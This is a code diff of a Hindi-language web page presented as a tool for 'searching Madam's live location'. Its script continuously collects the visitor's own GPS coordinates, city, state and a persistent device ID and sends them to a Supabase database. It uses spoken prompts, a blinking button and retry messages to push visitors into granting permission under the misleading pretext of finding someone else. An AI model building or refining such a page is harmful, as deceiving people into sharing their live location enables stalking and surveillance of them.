@@ -1,32 +1,43 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Madam Live Location Searching</title>
 <title>मैडम की लाइव लोकेशन सर्चिंग</title>
+
 <style>
+* { box-sizing: border-box; }
 
 body {
     font-family: Arial, sans-serif;
-    background: #f5f5f5;
+    background: #f3f7f4;
     margin: 0;
-    padding: 20px;
+    padding: 16px;
     text-align: center;
+    color: #17221a;
 }
 
 .container {
-    max-width: 500px;
+    max-width: 520px;
     margin: auto;
 }
 
+h2 {
+    font-size: 25px;
+    line-height: 1.5;
+}
+
 button {
-    padding: 12px 20px;
-    margin: 8px;
+    width: 100%;
+    min-height: 70px;
+    padding: 16px;
+    margin: 10px 0;
     border: none;
-    border-radius: 8px;
-    font-size: 16px;
+    border-radius: 15px;
+    font-size: 20px;
+    line-height: 1.4;
+    font-weight: bold;
     cursor: pointer;
 }
 
@@ -35,57 +46,99 @@ button {
     color: white;
 }
 
+.blink {
+    animation: greenBlink 1s infinite;
+}
+
+@keyframes greenBlink {
+    0%, 100% { filter: brightness(1); transform: scale(1); }
+    50% {
+        filter: brightness(1.4);
+        transform: scale(1.025);
+        box-shadow: 0 0 0 7px #16a34a35;
+    }
+}
+
 .stop {
     background: #dc2626;
     color: white;
 }
 
+.retry {
+    background: #2563eb;
+    color: white;
+}
+
+.hidden { display: none !important; }
+
+#instruction {
+    background: white;
+    border: 2px solid #d5e5d8;
+    border-radius: 15px;
+    padding: 20px 12px;
+    margin: 16px 0;
+    font-size: 22px;
+    font-weight: bold;
+    line-height: 1.6;
+}
+
 #status {
     background: white;
-    padding: 20px;
-    margin-top: 20px;
-    border-radius: 12px;
+    padding: 18px;
+    margin-top: 16px;
+    border-radius: 14px;
     text-align: left;
-    line-height: 1.7;
+    line-height: 1.8;
     word-break: break-word;
 }
 
+.note {
+    font-size: 14px;
+    color: #475569;
+    line-height: 1.6;
+}
 </style>
 </head>
 
 <body>
-
 <div class="container">
 
-<h2>📍 Madam Live Location Searching</h2>
 <h2>📍 मैडम की लाइव लोकेशन सर्चिंग</h2>
 
-    <button
-    class="start"
-    onclick="startTracking()">
-    ▶ Start Location / मैडम की लोकेशन सर्च करना स्टार्ट करें
+<div id="instruction">
+🟢 मैडम की लोकेशन सर्च करना शुरू करने के लिए हरा बटन दबाएँ।
+</div>
+
+<button id="startButton"
+ class="start blink"
+ onclick="startTracking()">
+🟢 मैडम की लोकेशन सर्च करना स्टार्ट करें — हरा बटन दबाएँ
 </button>
 
-<button
-    class="stop"
-    onclick="stopTracking()">
-    ⏹ Stop / मैडम की लोकेशन सर्च करना बंद करें
+<button id="retryButton"
+ class="retry hidden"
+ onclick="startTracking()">
+🔄 दोबारा लोकेशन की अनुमति दें
+</button>
+
+<button class="stop" onclick="stopTracking()">
+⏹ लोकेशन सर्च करना बंद करें
 </button>
 
 <div id="status">
-
-    📡 मैडम की लोकेशन ट्रैकिंग अभी बंद कर दी गई है बंद है.
-
+🟢 तैयार है। शुरू करने के लिए हरा बटन दबाएँ।
 </div>
 
-</div>
+<p class="note">
+लोकेशन तभी साझा होगी जब आप अनुमति देंगे।
+फोन पर आने वाला असली अनुमति संदेश ब्राउज़र दिखाएगा।
+</p>
 
+</div>
 
 <script>
 
-/* ==========================================
-   SUPABASE
-========================================== */
+/* SUPABASE — आपकी मौजूदा सेटिंग */
 
 const SUPABASE_URL =
 "https://qtfnupdojsqpuywhoryu.supabase.co";
@@ -94,338 +147,386 @@ const SUPABASE_KEY =
 "sb_publishable_GAsXGjXdKTZxlm5tqx-t0w_96i3RmKE";
 
 
-/* ==========================================
-   DEVICE ID
-========================================== */
+/* DEVICE ID */
 
-let deviceId =
-localStorage.getItem("device_id");
+let deviceId = localStorage.getItem("device_id");
 
 if (!deviceId) {
+    deviceId = (crypto.randomUUID)
+        ? crypto.randomUUID()
+        : "device-" + Date.now();
 
-    deviceId =
-        crypto.randomUUID();
+    localStorage.setItem("device_id", deviceId);
+}
 
-    localStorage.setItem(
-        "device_id",
-        deviceId
+
+/* VARIABLES */
+
+let watchId = null;
+let started = false;
+let lastSavedKey = "";
+let lastSaveTime = 0;
+
+const instructionEl = document.getElementById("instruction");
+const statusEl = document.getElementById("status");
+const startButton = document.getElementById("startButton");
+const retryButton = document.getElementById("retryButton");
+
+
+/* HINDI VOICE */
+
+function speak(text, callback) {
+    if (!("speechSynthesis" in window)) {
+        if (callback) callback();
+        return;
+    }
+
+    window.speechSynthesis.cancel();
+
+    const message = new SpeechSynthesisUtterance(text);
+    message.lang = "hi-IN";
+    message.rate = 0.88;
+    message.pitch = 1;
+
+    message.onend = function() {
+        if (callback) callback();
+    };
+
+    message.onerror = function() {
+        if (callback) callback();
+    };
+
+    window.speechSynthesis.speak(message);
+}
+
+
+/* START TRACKING */
+
+function startTracking() {
+
+    if (started) return;
+
+    if (!navigator.geolocation) {
+        instructionEl.textContent =
+            "❌ इस ब्राउज़र में लोकेशन की सुविधा उपलब्ध नहीं है।";
+
+        statusEl.textContent =
+            "कृपया Chrome जैसे समर्थित ब्राउज़र में पेज खोलें।";
+
+        speak("इस ब्राउज़र में लोकेशन की सुविधा उपलब्ध नहीं है।");
+        return;
+    }
+
+    started = true;
+
+    retryButton.classList.add("hidden");
+    startButton.classList.remove("blink");
+
+    startButton.textContent = "🟢 लोकेशन सर्चिंग शुरू हो रही है";
+
+    instructionEl.textContent =
+        "📍 मैडम को ढूंढने के लिए लोकेशन की अनुमति दें।";
+
+    statusEl.textContent =
+        "कृपया निर्देश सुनें। इसके बाद फोन पर अनुमति का संदेश आएगा।";
+
+    const permissionInstruction =
+        "मैडम को ढूंढने के लिए लोकेशन की अनुमति दें। " +
+        "स्क्रीन पर आने वाले Allow बटन या अनुमति दें बटन को दबाएँ।";
+
+    /*
+      पहले आवाज़ पूरी होगी।
+      उसके बाद ब्राउज़र असली GPS permission माँगेगा।
+    */
+
+    speak(permissionInstruction, function() {
+        if (!started) return;
+        requestLocation();
+    });
+
+    /*
+      यदि मोबाइल की आवाज़ पूरी होने का event न आए,
+      तो कुछ समय बाद अनुरोध आगे बढ़ेगा।
+    */
+
+    setTimeout(function() {
+        if (started && watchId === null) {
+            requestLocation();
+        }
+    }, 7000);
+}
+
+
+/* REQUEST LOCATION */
+
+function requestLocation() {
+
+    if (!started || watchId !== null) return;
+
+    instructionEl.textContent =
+        "📱 Allow / अनुमति दें बटन दबाएँ।";
+
+    statusEl.textContent =
+        "⏳ फोन पर आने वाले असली संदेश में Allow / अनुमति दें चुनें।";
+
+    watchId = navigator.geolocation.watchPosition(
+
+        function(position) {
+
+            if (!started) return;
+
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            instructionEl.textContent =
+                "✅ मैडम की लोकेशन मिल गई है।";
+
+            statusEl.innerHTML =
+                "✅ लोकेशन प्राप्त हो गई है।" +
+                "<br><br>📍 Latitude: " + latitude +
+                "<br>📍 Longitude: " + longitude +
+                "<br>🎯 Accuracy: " + accuracy.toFixed(1) + " मीटर" +
+                "<br><br>⏳ लोकेशन सर्वर पर सेव हो रही है...";
+
+            saveLocation(latitude, longitude, accuracy);
+        },
+
+        function(error) {
+
+            if (!started) return;
+
+            if (error.code === error.PERMISSION_DENIED) {
+
+                showDenied();
+
+            } else if (error.code === error.POSITION_UNAVAILABLE) {
+
+                instructionEl.textContent =
+                    "⚠️ फोन की लोकेशन नहीं मिल रही।";
+
+                statusEl.textContent =
+                    "फोन की Location चालू करें और दोबारा प्रयास करें।";
+
+                speak(
+                    "फोन की लोकेशन नहीं मिल रही। " +
+                    "कृपया फोन की लोकेशन चालू करके दोबारा प्रयास करें।"
+                );
+
+                showRetry();
+
+            } else if (error.code === error.TIMEOUT) {
+
+                instructionEl.textContent =
+                    "⏳ लोकेशन मिलने में समय लग रहा है।";
+
+                statusEl.textContent =
+                    "कृपया खुले स्थान पर जाएँ और दोबारा प्रयास करें।";
+
+                speak("लोकेशन मिलने में समय लग रहा है। कृपया दोबारा प्रयास करें।");
+
+                showRetry();
+
+            } else {
+
+                instructionEl.textContent =
+                    "⚠️ लोकेशन प्राप्त नहीं हो सकी।";
+
+                statusEl.textContent =
+                    "कृपया दोबारा प्रयास करें।";
+
+                showRetry();
+            }
+        },
+
+        {
+            enableHighAccuracy: true,
+            maximumAge: 0,
+            timeout: 30000
+        }
     );
 }
 
 
-/* ==========================================
-   GPS
-========================================== */
+/* DENIED / BLOCKED */
 
-let watchId = null;
+function showDenied() {
 
+    started = false;
 
-/* ==========================================
-   START
-========================================== */
-
-function startTracking() {
-
-    if (!navigator.geolocation) {
-
-        document.getElementById(
-            "status"
-        ).innerHTML =
-            "❌Madam GPS supported नहीं है.";
-
-        return;
+    if (watchId !== null) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
     }
 
+    instructionEl.textContent =
+        "❌ लोकेशन की अनुमति नहीं मिली।";
 
-    document.getElementById(
-        "status"
-    ).innerHTML =
-        "📡 Madam GPS signal मिल रहा है...";
+    statusEl.textContent =
+        "आपने लोकेशन की अनुमति नहीं दी है या ब्राउज़र में लोकेशन ब्लॉक है। " +
+        "मैडम को ढूंढने के लिए Location की अनुमति जरूरी है। " +
+        "दोबारा प्रयास करें। यदि संदेश फिर नहीं आता, तो ब्राउज़र की Site Settings में Location को Allow करें।";
 
+    showRetry();
 
-    watchId =
-        navigator.geolocation.watchPosition(
-
-            position => {
-
-                const latitude =
-                    position.coords.latitude;
-
-                const longitude =
-                    position.coords.longitude;
-
-                const accuracy =
-                    position.coords.accuracy;
-
-
-                document.getElementById(
-                    "status"
-                ).innerHTML = `
-
-                    📡 Madam GPS signal मिल रहा है...
-
-                    <br><br>
-
-                    Latitude:
-                    ${latitude}
-
-                    <br>
-
-                    Longitude:
-                    ${longitude}
-
-                    <br>
-
-                    🎯 Accuracy:
-                    ${accuracy.toFixed(1)} m
-
-                    <br><br>
-
-                    ⏳ Madam Location save हो रही है...
-
-                `;
-
-
-                saveLocation(
-                    latitude,
-                    longitude,
-                    accuracy
-                );
-
-            },
-
-            error => {
-
-                document.getElementById(
-                    "status"
-                ).innerHTML =
-
-                    "❌ GPS Error: " +
-                    error.message;
-            },
-
-            {
-
-                enableHighAccuracy: true,
-
-                maximumAge: 0,
-
-                timeout: 30000
-            }
-        );
+    speak(
+        "मैडम को ढूंढने के लिए लोकेशन की अनुमति जरूरी है। " +
+        "दोबारा प्रयास करने के लिए नीला बटन दबाएँ। " +
+        "अगर अनुमति का संदेश नहीं आता, तो ब्राउज़र की सेटिंग में लोकेशन को अनुमति दें।"
+    );
 }
 
 
-/* ==========================================
-   SAVE LOCATION
-========================================== */
+/* SHOW RETRY */
 
-async function saveLocation(
-    latitude,
-    longitude,
-    accuracy
-) {
+function showRetry() {
+
+    started = false;
+
+    if (watchId !== null) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+    }
+
+    startButton.classList.add("hidden");
+    retryButton.classList.remove("hidden");
+}
+
+
+/* SAVE LOCATION */
+
+async function saveLocation(latitude, longitude, accuracy) {
+
+    const key = latitude.toFixed(6) + "," + longitude.toFixed(6);
+    const now = Date.now();
+
+    if (key === lastSavedKey && now - lastSaveTime < 15000) {
+        return;
+    }
+
+    lastSavedKey = key;
+    lastSaveTime = now;
 
     try {
-
-        /* ==============================
-           CITY / STATE
-        ============================== */
 
         let city = "";
         let state = "";
 
+        /* CITY / STATE */
 
         try {
 
             const geoURL =
-                "https://api.bigdatacloud.net/data/" +
-                "reverse-geocode-client" +
-                "?latitude=" +
-                latitude +
-                "&longitude=" +
-                longitude +
+                "https://api.bigdatacloud.net/data/reverse-geocode-client" +
+                "?latitude=" + encodeURIComponent(latitude) +
+                "&longitude=" + encodeURIComponent(longitude) +
                 "&localityLanguage=en";
 
-
-            const geoResponse =
-                await fetch(geoURL);
-
+            const geoResponse = await fetch(geoURL);
 
             if (geoResponse.ok) {
 
-                const geoData =
-                    await geoResponse.json();
+                const geoData = await geoResponse.json();
 
-
-                city =
-                    geoData.city ||
-                    geoData.locality ||
-                    "";
-
-
-                state =
-                    geoData.principalSubdivision ||
-                    "";
+                city = geoData.city || geoData.locality || "";
+                state = geoData.principalSubdivision || "";
             }
 
         } catch (geoError) {
-
-            console.log(
-                "Reverse geocoding failed:",
-                geoError
-            );
+            console.log("City/State lookup failed:", geoError);
         }
 
 
-        /* ==============================
-           SUPABASE
-        ============================== */
+        /* SAVE TO SUPABASE */
 
-        const response =
-            await fetch(
-                SUPABASE_URL +
-                "/rest/v1/locations",
-                {
+        const response = await fetch(
+            SUPABASE_URL + "/rest/v1/locations",
+            {
+                method: "POST",
 
-                    method: "POST",
+                headers: {
+                    "apikey": SUPABASE_KEY,
+                    "Content-Type": "application/json",
+                    "Accept": "application/json",
+                    "Prefer": "return=representation"
+                },
 
-                    headers: {
-
-                        "apikey":
-                            SUPABASE_KEY,
-
-                        "Content-Type":
-                            "application/json",
-
-                        "Accept":
-                            "application/json",
-
-                        "Prefer":
-                            "return=representation"
-                    },
-
-                    body:
-                        JSON.stringify({
-
-                            device_id:
-                                deviceId,
-
-                            latitude:
-                                latitude,
-
-                            longitude:
-                                longitude,
-
-                            accuracy:
-                                accuracy,
-
-                            city:
-                                city,
-
-                            state:
-                                state
-                        })
-                }
-            );
-
+                body: JSON.stringify({
+                    device_id: deviceId,
+                    latitude: latitude,
+                    longitude: longitude,
+                    accuracy: accuracy,
+                    city: city,
+                    state: state
+                })
+            }
+        );
 
         if (!response.ok) {
-
-            const errorText =
-                await response.text();
-
-            throw new Error(
-                errorText
-            );
+            throw new Error(await response.text());
         }
 
+        if (!started) return;
 
-        document.getElementById(
-            "status"
-        ).innerHTML = `
+        instructionEl.textContent =
+            "✅ लोकेशन अपडेट हो गई है।";
 
-            ✅ Madam Location Saved
+        statusEl.innerHTML =
+            "✅ मैडम की लोकेशन सर्वर पर सेव हो गई है।" +
+            "<br><br>📍 Latitude: " + latitude +
+            "<br>📍 Longitude: " + longitude +
+            "<br>🎯 Accuracy: " + accuracy.toFixed(1) + " मीटर" +
+            "<br>🏙️ City: " + (city || "-") +
+            "<br>🗺️ State: " + (state || "-") +
+            "<br><br>🟢 लोकेशन ट्रैकिंग चालू है।";
 
-            <br><br>
-
-            📍 Latitude:
-            ${latitude}
-
-            <br>
-
-            📍 Longitude:
-            ${longitude}
-
-            <br>
-
-            🎯 Accuracy:
-            ${accuracy.toFixed(1)} m
-
-            <br>
-
-            🏙️ Madam City:
-            ${city || "-"}
-
-            <br>
-
-            🗺️ Madam State:
-            ${state || "-"}
-
-            <br><br>
-
-            🟢 Madam GPS tracking चालू है...
-
-        `;
-
+        speak("धन्यवाद। लोकेशन मिल गई है और अपडेट हो गई है।");
 
     } catch (error) {
 
-        console.error(
-            "Supabase Error:",
-            error
-        );
+        console.error("Supabase Error:", error);
 
+        if (!started) return;
 
-        document.getElementById(
-            "status"
-        ).innerHTML = `
+        instructionEl.textContent =
+            "⚠️ लोकेशन मिली, लेकिन सर्वर पर सेव नहीं हुई।";
 
-            ⚠️ Madam GPS मिल रहा है लेकिन
-            server पर save नहीं हो पाया.
-
-            <br><br>
-
-            ${error.message}
-
-        `;
+        statusEl.textContent =
+            "इंटरनेट कनेक्शन जाँचें। लोकेशन प्राप्त हुई, लेकिन सर्वर पर सेव नहीं हो पाई।";
     }
 }
 
 
-/* ==========================================
-   STOP
-========================================== */
+/* STOP */
 
 function stopTracking() {
 
+    started = false;
+
     if (watchId !== null) {
-
-        navigator.geolocation.clearWatch(
-            watchId
-        );
-
+        navigator.geolocation.clearWatch(watchId);
         watchId = null;
     }
 
+    if ("speechSynthesis" in window) {
+        window.speechSynthesis.cancel();
+    }
 
-    document.getElementById(
-        "status"
-    ).innerHTML =
-        "⏹ Madam Location tracking बंद है.";
+    startButton.classList.remove("hidden");
+    startButton.classList.add("blink");
+
+    startButton.textContent =
+        "🟢 मैडम की लोकेशन सर्च करना स्टार्ट करें — हरा बटन दबाएँ";
+
+    retryButton.classList.add("hidden");
+
+    instructionEl.textContent =
+        "🟢 दोबारा शुरू करने के लिए हरा बटन दबाएँ।";
+
+    statusEl.textContent =
+        "⏹ लोकेशन ट्रैकिंग बंद है।";
 }
 
 </script>
-
 </body>
 </html>
